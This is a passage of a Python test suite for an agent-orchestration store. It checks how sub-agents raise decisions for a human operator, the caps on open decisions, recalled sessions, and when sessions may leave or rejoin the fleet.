        store.apply(DecisionAnswered("d-1", "yes", node_id=agent), now=6.0)
        store.apply(DecisionDismissed("d-1", node_id=agent), now=6.0)
        assert store.snapshot() is before, agent

    store.apply(DecisionAnswered("d-1", " yes \n", at=6.5), now=7.0)

    assert store.snapshot().decisions["d-1"].outcome == Answered(" yes \n", at=6.5)
    assert store.snapshot().decisions["d-1"].answered_at == 6.5
    assert store.snapshot().needs_you == ()


def test_an_ended_decision_stays_as_it_ended_whoever_asks() -> None:
    store = _deciding()
    store.apply(DecisionRaised(CHILD, _decision()), now=5.0)
    store.apply(DecisionAnswered("d-1", "first"), now=6.0)
    answered = store.snapshot()

    store.apply(DecisionAnswered("d-1", "second"), now=7.0)
    store.apply(DecisionDismissed("d-1"), now=7.0)
    assert store.snapshot() is answered
    (told,) = store.apply(DecisionWithdrawn(CHILD, "d-1", request_id="k"), now=8.0)

    assert told == DecisionSettled(request_id="k", refusal=DecisionRefusal.ALREADY_ENDED)
    assert store.snapshot().decisions["d-1"].answer == "first"


def test_a_dismissal_records_no_answer() -> None:
    store = _deciding()
    store.apply(DecisionRaised(CHILD, _decision()), now=5.0)

    store.apply(DecisionDismissed("d-1"), now=6.0)

    landed = store.snapshot().decisions["d-1"]
    assert landed.outcome == Dismissed(at=6.0)
    assert landed.answer is None and landed.answered_at is None and not landed.is_open
    assert store.snapshot().needs_you == ()


def test_only_its_asker_withdraws_a_decision_and_each_refusal_says_which_mistake() -> None:
    store = _deciding()
    store.apply(DecisionRaised(CHILD, _decision()), now=5.0)
    held = store.snapshot().decisions["d-1"]

    (not_mine,) = store.apply(DecisionWithdrawn(ROOT, "d-1", request_id="a"), now=6.0)
    (elsewhere,) = store.apply(DecisionWithdrawn(OTHER, "d-1", request_id="b"), now=6.0)
    (mistyped,) = store.apply(DecisionWithdrawn(CHILD, "d-l", request_id="c"), now=6.0)

    assert not_mine == DecisionSettled("a", DecisionRefusal.NOT_THE_ASKER)
    assert elsewhere == DecisionSettled("b", DecisionRefusal.NOT_THE_ASKER)
    assert mistyped == DecisionSettled("c", DecisionRefusal.NO_SUCH_DECISION)
    assert store.snapshot().decisions["d-1"] is held
    assert len(store.snapshot().needs_you) == 1

    (done,) = store.apply(DecisionWithdrawn(CHILD, "d-1", request_id="d"), now=7.0)

    assert done == DecisionSettled("d", None)
    landed = store.snapshot().decisions["d-1"]
    assert landed.outcome == Withdrawn(at=7.0) and landed.answer is None
    assert store.snapshot().needs_you == ()


def _worker(n: int) -> NodeId:
    return ("sess-1", f"worker-{n}")


def test_an_agent_at_its_own_cap_is_refused_and_nobody_elses_allowance_is_spent() -> None:
    """
    The hazard: one worker fills an allowance its lead shares, and the lead --
    which has none of its own to withdraw and no lead to pass the question to
    -- is shut out. So the worker is refused at its own cap and the lead, the
    sibling and another session are each still let in.
    """
    store = _deciding()
    sibling = _worker(2)
    store.apply(spawn(sibling, ROOT))
    for n in range(MAX_OPEN_DECISIONS_PER_ASKER):
        store.apply(DecisionRaised(CHILD, _decision(f"d-{n}")), now=5.0)

    (over,) = store.apply(DecisionRaised(CHILD, _decision("d-over"), request_id="k"), now=6.0)
    (retry,) = store.apply(DecisionRaised(CHILD, _decision("d-0"), request_id="r"), now=6.0)
    (lead,) = store.apply(DecisionRaised(ROOT, _decision("d-lead"), request_id="l"), now=6.0)
    (beside,) = store.apply(DecisionRaised(sibling, _decision("d-sib"), request_id="s"), now=6.0)
    (apart,) = store.apply(DecisionRaised(OTHER, _decision("d-oth"), request_id="o"), now=6.0)

    assert over == DecisionSettled("k", DecisionRefusal.TOO_MANY_OPEN)
    assert retry == DecisionSettled("r", DecisionRefusal.ALREADY_RAISED), "not 'full'"
    assert lead == DecisionSettled("l", None)
    assert beside == DecisionSettled("s", None)
    assert apart == DecisionSettled("o", None)
    assert "d-over" not in store.snapshot().decisions

    store.apply(DecisionWithdrawn(CHILD, "d-3"), now=7.0)
    (freed,) = store.apply(DecisionRaised(CHILD, _decision("d-over"), request_id="k2"), now=8.0)
    assert freed == DecisionSettled("k2", None)


def _three_full_workers() -> Store:
    """A session whose sub-agents hold their shared allowance exactly."""
    assert MAX_OPEN_SUBAGENT_DECISIONS == 3 * MAX_OPEN_DECISIONS_PER_ASKER
    store = _deciding()
    for w in range(3):
        store.apply(spawn(_worker(w), ROOT))
        for n in range(MAX_OPEN_DECISIONS_PER_ASKER):
            store.apply(DecisionRaised(_worker(w), _decision(f"d-{w}-{n}")), now=5.0)
    return store


def test_the_sub_agents_shared_allowance_never_turns_the_root_away() -> None:
    store = _three_full_workers()
    store.apply(spawn(_worker(9), ROOT))

    (fourth,) = store.apply(DecisionRaised(_worker(9), _decision("d-9"), request_id="a"), now=6.0)
    (child,) = store.apply(DecisionRaised(CHILD, _decision("d-c"), request_id="b"), now=6.0)
    assert fourth == DecisionSettled("a", DecisionRefusal.SESSION_FULL)
    assert child == DecisionSettled("b", DecisionRefusal.SESSION_FULL)

    for n in range(MAX_OPEN_DECISIONS_PER_ASKER):
        (lead,) = store.apply(
            DecisionRaised(ROOT, _decision(f"d-lead-{n}"), request_id=f"l{n}"), now=7.0
        )
        assert lead == DecisionSettled(f"l{n}", None), n
    (own,) = store.apply(DecisionRaised(ROOT, _decision("d-lead-x"), request_id="x"), now=8.0)
    assert own == DecisionSettled("x", DecisionRefusal.TOO_MANY_OPEN), "its own, and only its own"

    # The root's eight are not in the sub-agents' count either: one withdrawal
    # by a worker lets one worker in.
    store.apply(DecisionWithdrawn(_worker(0), "d-0-0"), now=9.0)
    (now_in,) = store.apply(DecisionRaised(CHILD, _decision("d-c"), request_id="c"), now=9.0)
    assert now_in == DecisionSettled("c", None)


@pytest.mark.parametrize(
    ("ending", "frees"),
    [
        (AgentFinished(_worker(0), AgentState.DONE, ended_at=6.0), True),
        (AgentFinished(_worker(0), AgentState.CANCELLED, ended_at=6.0), True),
        (AgentFinished(_worker(0), AgentState.FAILED, ended_at=6.0, error="x"), True),
        (StateChanged(_worker(0), AgentState.AWAITING_INPUT), False),
        (StateChanged(_worker(0), AgentState.THINKING), False),
    ],
)
def test_a_finished_askers_open_decisions_do_not_count_against_the_others(
    ending: Intent, frees: bool
) -> None:
    """
    Only the operator closes a finished worker's decisions. Counted, eight of
    them would refuse every agent still working until somebody dismissed each
    by hand -- and in a session nobody is watching, for good. An agent that has
    only ended its turn can still withdraw, so its own still count.
    """
    store = _three_full_workers()
    store.apply(ending, now=6.0)

    (told,) = store.apply(DecisionRaised(CHILD, _decision("d-c"), request_id="k"), now=7.0)

    assert told == DecisionSettled("k", None if frees else DecisionRefusal.SESSION_FULL)
    # Still the operator's to answer or dismiss, whoever it stopped counting for.
    still = [
        o for o in store.snapshot().needs_you if o.kind.value == "decision" and o.node == _worker(0)
    ]
    assert len(still) == MAX_OPEN_DECISIONS_PER_ASKER


def test_a_decision_blocks_only_tasks_that_are_on_its_askers_board() -> None:
    """
    The queue row says "blocks t-4" in the queue's own voice, so the id has to
    be a task that is there: on the asker's board, not another session's, and
    not a word that is no task at all.
    """
    store = _deciding()
    store.apply(TaskDeclared(Task(id="t-4", title="x", declared_at=1.0), node_id=ROOT))
    store.apply(TaskDeclared(Task(id="t-other", title="x", declared_at=1.0), node_id=OTHER))

    def raised(did: str, *blocks: str) -> object:
        (told,) = store.apply(
            DecisionRaised(CHILD, _decision(did, blocks=blocks), request_id=did), now=5.0
        )
        return told

    assert raised("d-a", "t-4") == DecisionSettled("d-a", None)
    assert raised("d-b") == DecisionSettled("d-b", None)
    assert raised("d-c", "t-4", "t-nowhere") == DecisionSettled("d-c", DecisionRefusal.UNKNOWN_TASK)
    assert raised("d-d", "t-other") == DecisionSettled("d-d", DecisionRefusal.UNKNOWN_TASK)
    assert raised("d-e", "does not hold up t-4") == DecisionSettled(
        "d-e", DecisionRefusal.UNKNOWN_TASK
    )
    assert set(store.snapshot().decisions) == {"d-a", "d-b"}
    assert store.snapshot().decisions["d-a"].blocks == ("t-4",)


def test_an_answer_past_the_bound_is_not_applied_and_is_not_cut_to_fit() -> None:
    """
    An answer too long for ``read_decisions`` to return whole is one its asker
    can never read, and one cut to fit is no longer what the operator typed. So
    it is not taken, the decision stays in the queue, and the answer at the
    bound exactly is stored whole.
    """
    store = _deciding()
    store.apply(DecisionRaised(CHILD, _decision()), now=5.0)
    before = store.snapshot()

    store.apply(DecisionAnswered("d-1", "x" * (MAX_ANSWER_CHARS + 1)), now=6.0)

    assert store.snapshot() is before
    assert [o.key for o in store.snapshot().needs_you] == ["decision:d-1"]

    at_the_bound = "y" * (MAX_ANSWER_CHARS - 1) + "\n"
    store.apply(DecisionAnswered("d-1", at_the_bound), now=7.0)
    assert store.snapshot().decisions["d-1"].answer == at_the_bound
    assert store.snapshot().needs_you == ()


def test_a_read_shows_an_agent_its_own_and_the_root_its_whole_session() -> None:
    store = _deciding()
    store.apply(DecisionRaised(CHILD, _decision("d-1")), now=5.0)
    store.apply(DecisionRaised(CHILD, _decision("d-2")), now=6.0)
    store.apply(DecisionRaised(ROOT, _decision("d-leads")), now=8.0)
    store.apply(DecisionRaised(OTHER, _decision("d-elsewhere")), now=8.5)
    store.apply(DecisionAnswered("d-1", "for the child"), now=9.0)
    store.apply(DecisionAnswered("d-leads", "for the lead"), now=9.0)

    def read(who: NodeId, wanted: str | None = None) -> list[str]:
        (told,) = store.apply(DecisionsRead(who, "r", at=10.0, decision_id=wanted), now=10.0)
        assert isinstance(told, DecisionsDelivered) and told.decisions is not None
        return [d.id for d in told.decisions]

    assert read(CHILD) == ["d-1", "d-2"]
    assert read(ROOT) == ["d-1", "d-2", "d-leads"]
    assert read(OTHER) == ["d-elsewhere"]
    assert read(("sess-1", "never-raised")) == []
    # Naming one does not narrow or widen what the reader is shown.
    assert read(CHILD, "d-leads") == ["d-1", "d-2"]


def test_an_answer_is_recorded_as_read_only_by_its_askers_read_of_that_decision() -> None:
    """
    ``first_delivered_at`` is what the pane tells the operator about whether
    their answer was read. The reads that must not set it: a list, which shows
    no answer; the asker naming a different decision; the root reading its
    worker's; and anybody else naming it. Then the asker's own read sets it
    once, and the answer is in the reply to every read after.
    """
    store = _deciding()
    for did in ("d-1", "d-2", "d-3"):
        store.apply(DecisionRaised(CHILD, _decision(did)), now=5.0)
    store.apply(DecisionAnswered("d-1", "yes"), now=6.0)
    store.apply(DecisionAnswered("d-2", "no"), now=6.0)
    store.apply(DecisionDismissed("d-3"), now=6.0)

    def stamps() -> list[float | None]:
        held = store.snapshot().decisions
        return [held[did].first_delivered_at for did in ("d-1", "d-2", "d-3")]

    for reader, wanted in (
        (CHILD, None),
        (CHILD, "d-typo"),
        (ROOT, None),
        (ROOT, "d-1"),
        (OTHER, "d-1"),
        (("sess-1", "agent-b"), "d-1"),
    ):
        store.apply(DecisionsRead(reader, "r", at=10.0, decision_id=wanted), now=10.0)
        assert stamps() == [None, None, None], (reader, wanted)

    (first,) = store.apply(DecisionsRead(CHILD, "r1", at=20.0, decision_id="d-1"), now=20.0)
    assert stamps() == [20.0, None, None], "the one it named, not every ended one"
    (second,) = store.apply(DecisionsRead(CHILD, "r2", at=30.0, decision_id="d-1"), now=30.0)
    assert stamps() == [20.0, None, None], "set once"
    store.apply(DecisionsRead(CHILD, "r3", at=40.0, decision_id="d-3"), now=40.0)
    assert stamps() == [20.0, None, 40.0], "a dismissal is read the same way"

    # The reply is the records as they stood before this read was marked.
    assert isinstance(first, DecisionsDelivered) and first.decisions is not None
    assert isinstance(second, DecisionsDelivered) and second.decisions is not None
    assert first.decisions[0].first_delivered_at is None and first.decisions[0].answer == "yes"
    assert second.decisions[0].first_delivered_at == 20.0 and second.decisions[0].answer == "yes"


def test_a_read_changes_nothing_but_the_delivery_stamp() -> None:
    store = _deciding()
    store.apply(DecisionRaised(CHILD, _decision()), now=5.0)
    store.apply(DecisionAnswered("d-1", "yes"), now=6.0)
    answered = store.snapshot().decisions["d-1"]

    store.apply(DecisionsRead(CHILD, "r1", at=10.0, decision_id="d-1"), now=10.0)

    assert store.snapshot().decisions["d-1"] == dataclasses.replace(
        answered, first_delivered_at=10.0
    )


def test_a_snapshot_with_no_open_decision_pays_nothing_for_the_projection() -> None:
    """``_owing_decisions`` hands back the snapshot it was given."""
    from pptmstr import store as store_module

    world = dataclasses.replace(
        Snapshot.empty(), decisions={"d-1": _decision(outcome=Dismissed(1.0))}
    )

    assert store_module._owing_decisions(world) is world


# -- a session recalled from its file, and a session off the fleet ------------------

CLOSED = "sess-closed"
CLOSED_ROOT: NodeId = (CLOSED, None)
CLOSED_CHILD: NodeId = (CLOSED, "agent-c")

_FROM_FILE = Recalled(
    transcript=TranscriptPresence.PRESENT,
    created_at=1_760_000_000.0,
    last_active=1_760_003_600.0,
    ended_how=EndedHow.FAILED,
    policy=Policy.AUTONOMOUS,
    contained=True,
    cost_usd=1.25,
    error="the API said no",
)


def recall(session_id: str = CLOSED, recalled: Recalled = _FROM_FILE) -> SessionRecalled:
    return SessionRecalled(
        session_id=session_id,
        task="the first thing it was asked",
        model="claude-opus-5",
        recalled=recalled,
        cwd="/w/project",
        session_base="/w/project",
        template="team",
        brief="/briefs/sess-closed",
    )


def _closed_session(store: Store, root: NodeId, *children: NodeId) -> None:
    """A session this process ran and somebody closed: every node of it DONE."""
    store.apply(spawn(root), now=1.0)
    for child in children:
        store.apply(spawn(child, root), now=2.0)
        store.apply(AgentFinished(child, AgentState.DONE, ended_at=3.0), now=3.0)
    store.apply(AgentFinished(root, AgentState.DONE, ended_at=4.0), now=4.0)


def _detach(store: Store, session_id: str) -> DetachRefusal | None:
    (answer,) = store.apply(SessionDetached(session_id, request_id="rq-1"))
    assert isinstance(answer, SessionDetachSettled)
    assert (answer.request_id, answer.session_id) == ("rq-1", session_id)
    return answer.refusal


def test_a_recalled_record_holds_what_the_file_said_and_nothing_this_process_measured() -> None:
    store = Store()
    store.apply(recall(), now=500.0)

    rec = store.snapshot().nodes[CLOSED_ROOT]
    assert rec.recalled is _FROM_FILE
    assert (rec.task, rec.model) == ("the first thing it was asked", "claude-opus-5")
    assert (rec.cwd, rec.session_base) == ("/w/project", "/w/project")
    assert (rec.template, rec.brief) == ("team", "/briefs/sess-closed")
    assert rec.parent is None and rec.depth == 0
    # No instant of this process's clock, though one was at hand: the file's
    # times are wall-clock and stay in ``recalled``.
    assert (rec.started_at, rec.ended_at, rec.state_since) == (0.0, None, 0.0)
    assert rec.usage == UsageRollup() and rec.context is None and rec.error is None
    assert rec.transcript.published_length == 0
    # The rung a reader may show is the file's, not the field's default.
    assert rec.policy is Policy.STRICT and rec.granted_policy is Policy.AUTONOMOUS


def test_a_session_that_had_failed_is_recalled_owing_nothing_and_idle() -> None:
    store = Store()
    store.apply(recall(), now=500.0)

    snap = store.snapshot()
    assert _FROM_FILE.ended_how is EndedHow.FAILED
    assert snap.nodes[CLOSED_ROOT].state is AgentState.DONE
    assert snap.needs_you == () and not snap.any_active


@pytest.mark.parametrize("held", [CLOSED_ROOT, CLOSED_CHILD], ids=["the root", "a sub-agent"])
def test_a_recall_never_replaces_a_record_of_the_session(held: NodeId) -> None:
    """
    A recall is read off the frame, so it can land after the session was
    launched here. Whatever the store has under the id stands: the root, or a
    sub-agent that reached the store before its root did.
    """
    store = Store()
    store.apply(spawn(held, at=7.0), now=7.0)
    store.apply(StateChanged(held, AgentState.THINKING), now=8.0)
    before = store.snapshot()

    assert store.apply(recall(), now=9.0) == ()

    assert store.snapshot() is before
    assert before.nodes[held].recalled is None and before.nodes[held].state.is_active


def test_a_recall_never_replaces_a_session_that_ended_in_this_process() -> None:
    store = Store()
    _closed_session(store, CLOSED_ROOT)
    before = store.snapshot()

    store.apply(recall(), now=9.0)

    assert store.snapshot() is before
    assert before.nodes[CLOSED_ROOT].recalled is None and before.nodes[CLOSED_ROOT].ended_at == 4.0


def test_a_second_recall_of_one_session_changes_nothing() -> None:
    store = Store()
    store.apply(recall(), now=1.0)
    before = store.snapshot()

    store.apply(recall(recalled=Recalled(ended_how=EndedHow.CLOSED)), now=2.0)

    assert store.snapshot() is before


_RUN_REPORTS_ABOUT_A_NODE: tuple[Intent, ...] = (
    StateChanged(CLOSED_ROOT, AgentState.THINKING, topic="working"),
    StateChanged(CLOSED_ROOT, AgentState.AWAITING_INPUT),
    SubagentProgress(CLOSED_ROOT, "working"),
    SubagentDelivered(CLOSED_ROOT, "an answer"),
    TopicChanged(CLOSED_ROOT, "reading"),
    UsageAccrued(CLOSED_ROOT, UsageRollup(input_tokens=10, total_cost_usd=0.5)),
    ContextPolled(CLOSED_ROOT, ctx(10)),
    CompactionObserved(CLOSED_ROOT, 3.0, "auto"),
    AgentFinished(CLOSED_ROOT, AgentState.FAILED, ended_at=3.0, error="died"),
    AgentFinished(CLOSED_ROOT, AgentState.CANCELLED, ended_at=3.0),
    AgentResumed(CLOSED_ROOT, at=3.0),
)


def test_every_run_report_has_a_case_in_the_test_below() -> None:
    from pptmstr import store as store_module

    assert {type(i) for i in _RUN_REPORTS_ABOUT_A_NODE} == set(store_module._RUN_REPORTS)


@pytest.mark.parametrize("report", _RUN_REPORTS_ABOUT_A_NODE, ids=lambda i: f"{type(i).__name__}")
def test_what_a_run_says_of_its_node_never_lands_on_a_recalled_record(report: Intent) -> None:
    """
    No run in this process stands behind a recalled record, so a report of
    where it is, what it spent or how it ended is not about it. Applied, each of
    these would put something this process appears to have measured on a card
    whose whole statement is that it measured nothing -- and the failure and the
    resume would make a session with no process owe a row or look live.
    """
    store = Store()
    store.apply(recall(), now=1.0)
    before = store.snapshot()

    store.apply(report, now=3.0)

    assert store.snapshot() is before


def test_the_announce_of_a_recalled_session_replaces_the_record_whole() -> None:
    store = Store()
    store.apply(recall(), now=1.0)
    _detach(store, CLOSED)
    assert store.snapshot().off_fleet(CLOSED)

    store.apply(spawn(CLOSED_ROOT, at=50.0), now=50.0)

    snap = store.snapshot()
    rec = snap.nodes[CLOSED_ROOT]
    assert rec.recalled is None and not rec.detached and not snap.off_fleet(CLOSED)
    assert rec.state is AgentState.SPAWNING and rec.started_at == 50.0
    assert rec.granted_policy is Policy.STRICT
    # And it now takes what a run says of it.
    store.apply(UsageAccrued(CLOSED_ROOT, UsageRollup(input_tokens=10)), now=51.0)
    assert store.snapshot().nodes[CLOSED_ROOT].usage.input_tokens == 10


def test_recalled_sessions_are_ordered_after_everything_this_process_launched() -> None:
    """
    A fleet is recalled at startup, ahead of every launch. In insertion order the
    closed cards would sit above all live work for the life of the process.
    """
    store = Store()
    store.apply(recall("old-1"), now=1.0)
    store.apply(recall("old-2"), now=1.0)
    store.apply(spawn(ROOT), now=2.0)
    store.apply(spawn(CHILD, ROOT), now=3.0)
    store.apply(spawn(OTHER), now=4.0)

    assert store.snapshot().order == (ROOT, CHILD, OTHER, ("old-1", None), ("old-2", None))


def test_a_resumed_session_is_ordered_as_the_launch_it_is() -> None:
    store = Store()
    store.apply(recall("old-1"), now=1.0)
    store.apply(recall("old-2"), now=1.0)
    store.apply(spawn(ROOT), now=2.0)

    store.apply(spawn(("old-1", None), at=5.0), now=5.0)
    # A launch announces its root twice; the second changes no position.
    store.apply(spawn(("old-1", None), at=5.0), now=5.0)
    store.apply(spawn(OTHER), now=6.0)

    assert store.snapshot().order == (ROOT, ("old-1", None), OTHER, ("old-2", None))


def test_an_approval_for_a_recalled_record_is_kept_and_the_record_is_recalled_no_more() -> None:
    """
    An approval is never dropped: an agent is parked on it. So a process does
    stand behind this record, and a card saying it has none while it asks for a
    review is the worse of the two wrong cards.
    """
    store = Store()
    store.apply(recall("old-1"), now=1.0)
    store.apply(recall(), now=1.0)
    store.apply(spawn(ROOT), now=2.0)
    _detach(store, CLOSED)

    store.apply(ApprovalRequested(CLOSED_ROOT, pending(CLOSED_ROOT)), now=3.0)

    snap = store.snapshot()
    assert [o.node for o in snap.needs_you] == [CLOSED_ROOT]
    assert snap.nodes[CLOSED_ROOT].recalled is None
    # Owed, so it is back on the fleet, and no longer ordered as a closed card:
    # it is among the records of this process, where it was put in the store.
    assert not snap.off_fleet(CLOSED) and not snap.nodes[CLOSED_ROOT].detached
    assert snap.order == (CLOSED_ROOT, ROOT, ("old-1", None))


def test_a_decision_raised_by_a_recalled_record_is_owed_by_one_recalled_no_more() -> None:
    store = Store()
    store.apply(recall(), now=1.0)

    store.apply(DecisionRaised(CLOSED_ROOT, _decision(asker=CLOSED_ROOT)), now=3.0)

    snap = store.snapshot()
    assert [o.node for o in snap.needs_you] == [CLOSED_ROOT]
    assert snap.nodes[CLOSED_ROOT].recalled is None


# -- off the fleet -----------------------------------------------------------------


def test_a_closed_session_leaves_the_fleet_and_nothing_of_it_leaves_the_store() -> None:
    store = Store()
    _closed_session(store, ROOT, CHILD)
    store.apply(TaskDeclared(Task(id="t1", title="x"), node_id=ROOT), now=5.0)
    before = store.snapshot()

    assert _detach(store, "sess-1") is None

    snap = store.snapshot()
    assert snap.off_fleet("sess-1") and snap.nodes[ROOT].detached
    assert not snap.nodes[CHILD].detached
    assert set(snap.nodes) == set(before.nodes) and snap.order == before.order
    assert snap.tasks == before.tasks
    # Said twice, it is still off, and the second changes nothing.
    assert _detach(store, "sess-1") is None
    assert store.snapshot() is snap


def test_a_recalled_session_leaves_the_fleet() -> None:
    store = Store()
    store.apply(recall(), now=1.0)

    assert _detach(store, CLOSED) is None
    assert store.snapshot().off_fleet(CLOSED)


def test_a_session_the_store_has_never_heard_of_cannot_leave() -> None:
    store = Store()
    store.apply(spawn(CHILD, at=1.0), now=1.0)
    before = store.snapshot()

    assert _detach(store, "nobody") is DetachRefusal.NO_SUCH_SESSION
    # A sub-agent with no root is not a session to remove either.
    assert _detach(store, "sess-1") is DetachRefusal.NO_SUCH_SESSION
    assert store.snapshot() is before


def test_a_dismissed_failed_session_cannot_leave_because_it_can_still_answer() -> None:
    """
    The plan review's F1. The driver reports an error result as FAILED with its
    client still connected; the operator dismisses the row, so the root is
    terminal and nothing is owed. Taking it off the fleet there hides a session
    whose process is alive, and its next message is a question with no card.
    """
    store = Store()
    store.apply(spawn(ROOT), now=1.0)
    store.apply(AgentFinished(ROOT, AgentState.FAILED, ended_at=2.0, error="overloaded"), now=2.0)
    store.apply(FailureAcknowledged(ROOT), now=3.0)
    before = store.snapshot()
    assert before.nodes[ROOT].state.is_terminal and before.needs_you == ()

    assert _detach(store, "sess-1") is DetachRefusal.FAILED_NOT_CLOSED

    assert store.snapshot() is before and not before.off_fleet("sess-1")
    # The revival the refusal is about.
    store.apply(StateChanged(ROOT, AgentState.AWAITING_INPUT), now=4.0)
    assert [o.node for o in store.snapshot().needs_you] == [ROOT]


@pytest.mark.parametrize(
    "state",
    [s for s in AgentState if not s.is_terminal],
    ids=lambda s: s.value,
)
def test_a_session_with_an_agent_that_has_not_ended_cannot_leave(state: AgentState) -> None:
    store = Store()
    _closed_session(store, ROOT)
    store.apply(spawn(CHILD, ROOT), now=5.0)
    if state is not AgentState.SPAWNING:
        store.apply(StateChanged(CHILD, state), now=6.0)
    assert store.snapshot().nodes[CHILD].state is state

    assert _detach(store, "sess-1") is DetachRefusal.NOT_ENDED
    assert not store.snapshot().nodes[ROOT].detached


def test_a_failed_sub_agent_does_not_keep_a_closed_session_on_the_fleet() -> None:
    """
    Only the root has to be final. A sub-agent has no process but its session's,
    and nothing closes one, so a rule that asked it to be final would keep every
    session a failed sub-agent belongs to on the fleet for good.
    """
    store = Store()
    _closed_session(store, ROOT)
    store.apply(spawn(CHILD, ROOT), now=5.0)
    store.apply(AgentFinished(CHILD, AgentState.FAILED, ended_at=6.0, error="x"), now=6.0)
    store.apply(FailureAcknowledged(CHILD), now=7.0)

    assert _detach(store, "sess-1") is None


def test_a_session_owed_an_approval_on_a_finished_node_cannot_leave() -> None:
    store = Store()
    _closed_session(store, ROOT, CHILD)
    store.apply(ApprovalRequested(CHILD, pending(CHILD)), now=5.0)
    assert store.snapshot().nodes[CHILD].state is AgentState.DONE

    assert _detach(store, "sess-1") is DetachRefusal.OWES

    store.apply(ApprovalResolved(CHILD, "p1", approved=False), now=6.0)
    assert _detach(store, "sess-1") is None


def test_a_session_with_an_open_decision_cannot_leave_until_it_is_ended() -> None:
    store = Store()
    store.apply(spawn(ROOT), now=1.0)
    store.apply(spawn(CHILD, ROOT), now=1.0)
    store.apply(DecisionRaised(CHILD, _decision()), now=2.0)
    store.apply(AgentFinished(CHILD, AgentState.DONE, ended_at=3.0), now=3.0)
    store.apply(AgentFinished(ROOT, AgentState.DONE, ended_at=3.0), now=3.0)

    assert _detach(store, "sess-1") is DetachRefusal.OWES

    store.apply(DecisionDismissed("d-1"), now=4.0)
    assert _detach(store, "sess-1") is None


def _off_fleet() -> Store:
    store = Store()
    _closed_session(store, ROOT, CHILD)
    store.apply(spawn(OTHER), now=5.0)
    assert _detach(store, "sess-1") is None
    return store


_BRINGS_IT_BACK: tuple[tuple[str, Intent], ...] = (
    ("a sub-agent is woken", AgentResumed(CHILD, at=9.0)),
    ("a new sub-agent starts", spawn(("sess-1", "agent-late"), ROOT, at=9.0)),
    ("an approval lands on a finished node", ApprovalRequested(CHILD, pending(CHILD))),
    ("a decision is raised", DecisionRaised(CHILD, _decision())),
    ("its root is announced again", spawn(ROOT, at=9.0)),
    ("its root is reported failed", AgentFinished(ROOT, AgentState.FAILED, 9.0, error="x")),
)


@pytest.mark.parametrize(
    "intent", [i for _, i in _BRINGS_IT_BACK], ids=[name for name, _ in _BRINGS_IT_BACK]
)
def test_a_session_off_the_fleet_is_back_on_it_when_anything_of_it_acts_or_is_owed(
    intent: Intent,
) -> None:
    store = _off_fleet()

    store.apply(intent, now=9.0)

    snap = store.snapshot()
    assert not snap.off_fleet("sess-1")
    # The stored half goes too, and a session nobody touched is not affected.
    assert not snap.nodes[ROOT].detached


def test_a_session_brought_back_does_not_leave_again_by_itself() -> None:
    """
    It left because the operator said so of a session that was over. Once an
    agent of it has run again, its ending is not the operator saying it twice.
    """
    store = _off_fleet()
    store.apply(AgentResumed(CHILD, at=9.0), now=9.0)

    store.apply(AgentFinished(CHILD, AgentState.DONE, ended_at=10.0), now=10.0)

    snap = store.snapshot()
    assert snap.detach_refusal("sess-1") is None
    assert not snap.off_fleet("sess-1")


def test_what_does_not_wake_a_finished_node_does_not_bring_its_session_back() -> None:
    store = _off_fleet()

    store.apply(StateChanged(CHILD, AgentState.THINKING), now=9.0)
    store.apply(SubagentProgress(CHILD, "still going"), now=9.0)
    store.apply(UsageAccrued(ROOT, UsageRollup(input_tokens=1)), now=9.0)
    store.apply(StateChanged(OTHER, AgentState.THINKING), now=9.0)

    assert store.snapshot().off_fleet("sess-1")


def test_a_declaration_refused_for_an_id_held_off_the_fleet_says_whose() -> None:
    """
    Task ids are fleet-wide and a session off the fleet keeps its board, so it
    goes on refusing ids from where neither the declarer nor the operator can
    see it. That is a recorded limitation; what the store owes is the fact.
    """
    store = Store()
    _closed_session(store, OTHER)
    store.apply(TaskDeclared(Task(id="t1", title="theirs"), node_id=OTHER), now=5.0)
    store.apply(spawn(ROOT), now=6.0)

    def declare() -> TaskWriteSettled:
        (answer,) = store.apply(
            TaskDeclared(Task(id="t1", title="mine"), node_id=ROOT, request_id="rq"), now=7.0
        )
        assert isinstance(answer, TaskWriteSettled)
        return answer

    seen = declare()
    assert (seen.refusal, seen.held_off_fleet) == (TaskRefusal.DUPLICATE_ID, None)

    assert _detach(store, "sess-2") is None
    hidden = declare()
    assert (hidden.refusal, hidden.held_off_fleet) == (TaskRefusal.DUPLICATE_ID, "sess-2")
    assert store.snapshot().tasks["t1"].title == "theirs"

    # A duplicate of the declarer's own id is not that.
    store.apply(TaskDeclared(Task(id="t2", title="mine"), node_id=ROOT), now=8.0)
    (own,) = store.apply(
        TaskDeclared(Task(id="t2", title="again"), node_id=ROOT, request_id="rq"), now=9.0
    )
    assert isinstance(own, TaskWriteSettled) and own.held_off_fleet is None


# -- the same, as generated sequences ------------------------------------------------

_FLEET_NODES: tuple[NodeId, ...] = (ROOT, CHILD, OTHER, CLOSED_ROOT, CLOSED_CHILD)
_FLEET_SESSIONS = ("sess-1", "sess-2", CLOSED, "nobody")


def _fleet_intent(r: random.Random, snap: Snapshot, now: float) -> Intent:
    node = r.choice(_FLEET_NODES)
    session = r.choice(_FLEET_SESSIONS)
    root: NodeId = (node[0], None)
    open_approvals = [
        (o.node, o.approval.id) for o in snap.needs_you if isinstance(o, ApprovalNeeded)
    ]
    makers: tuple[Any, ...] = (
        lambda: recall(session),
        lambda: recall(session),
        lambda: SessionDetached(session),
        lambda: SessionDetached(session),
        lambda: SessionDetached(session),
        lambda: FailedSessionClosed(node, run_held=r.random() < 0.4),
        lambda: FailedSessionClosed(root, run_held=r.random() < 0.4),
        lambda: spawn(node, None if node[1] is None else root, at=now),
        lambda: StateChanged(node, r.choice(list(AgentState))),
        lambda: AgentFinished(
            node,
            r.choice((AgentState.DONE, AgentState.DONE, AgentState.FAILED, AgentState.CANCELLED)),
            ended_at=now,
            error=None,
        ),
        lambda: AgentFinished(root, AgentState.DONE, ended_at=now),
        lambda: AgentResumed(node, at=now),
        lambda: FailureAcknowledged(node),
        lambda: ApprovalRequested(node, pending(node, f"p{r.randrange(3)}", at=now)),
        lambda: (
            ApprovalResolved(*r.choice(open_approvals), approved=r.random() < 0.5)
            if open_approvals
            else ApprovalResolved(node, "p0", approved=True)
        ),
        lambda: UsageAccrued(node, UsageRollup(input_tokens=5, total_cost_usd=0.1)),
        lambda: TopicChanged(node, "reading"),
        lambda: ContextPolled(node, ctx(10)),
        lambda: SubagentProgress(node, "working"),
        lambda: SubagentDelivered(node, "answer"),
        lambda: DecisionRaised(node, _decision(f"d-{r.randrange(4)}", asker=node)),
        lambda: DecisionDismissed(f"d-{r.randrange(4)}"),
        lambda: AgentRemoved(node),
    )
